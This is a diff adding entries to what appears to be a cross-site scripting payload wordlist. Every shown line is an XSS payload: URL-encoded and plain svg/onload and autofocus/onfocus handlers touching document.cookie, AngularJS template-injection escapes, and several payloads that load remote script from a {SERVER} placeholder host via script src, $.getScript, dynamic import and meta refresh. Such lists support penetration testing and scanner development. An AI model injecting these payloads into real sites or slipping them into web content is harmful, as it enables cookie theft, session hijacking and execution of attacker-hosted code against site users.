@@ -2688,3 +2688,22 @@ foo<script>alert(1)</script>
 <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 <marquee onstart='javascript:alert('1');'>=(◕_◕)=
+%22%3E%3C%2Fscript%3E%22%3E%3C--%3Cimg%2Bsrc%3D%20%22%3E%3Csvg%2Fonload%3Dalert(document.cookie)%3E%3E%20--%21%3E
+%22%3E%3C%2Fscript%3E%22%3E%3C--%3Cimg%2Bsrc%3D%20%22%3E%3Csvg%2Fonload%3Dalert(document.cookie)%3E%3E%20--%21%3E
+%60-alert%3F.(1)-%27
+%2522autofocus%252fonfocus%253dalert(1)--%253E
+%2522autofocus%252fonfocus%253dalert(1)--%253E
+%7B%7Bconstructor.constructor(%22import('%7BSERVER%7D')%22)()%7D%7D
+%22%22%22%3E%3Cscript%20src%3D%22%7BSERVER%7D%2Fscript.js%22%3E%3C%2Fscript%3E
+%22%3E%3Cscript%3E$.getScript(%22%7BSERVER%7D%22)%3C%2Fscript%3E
+%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3B%20url%3D%7BSERVER%7D%22%20%2F%3E
+%7B%7B'a'.constructor.prototype.charAt%3D%22.valueOf%3B%20%24eval(%22x%3D'%5C%22%2B(y%3D'if(!window%5Cu002ex)alert(window%20%5Cu002ex%3D1)')%2Beval(y)%2B%22%5C%22')%3B%7D%7D
+"></script>"><--<img+src= "><svg/onload=alert(document.cookie)>> --!>
+"></script>"><--<img+src= "><svg/onload=alert(document.cookie)>> --!>
+`-alert?.(1)-'
+%22autofocus%2fonfocus%3dalert(1)--%3E
+{{constructor.constructor("import('{SERVER}')")()}}
+{{'a'.constructor.prototype.charAt=".valueOf; $eval("x='\"+(y='if(!window\\u002ex)alert(window\ \u002ex=1)')+eval(y)+\"");}}
+"""><script src="{SERVER}/script.js"></script>
+"><script>$.getScript("{SERVER}")</script>
+<meta http-equiv="refresh" content="0; url={SERVER}" />
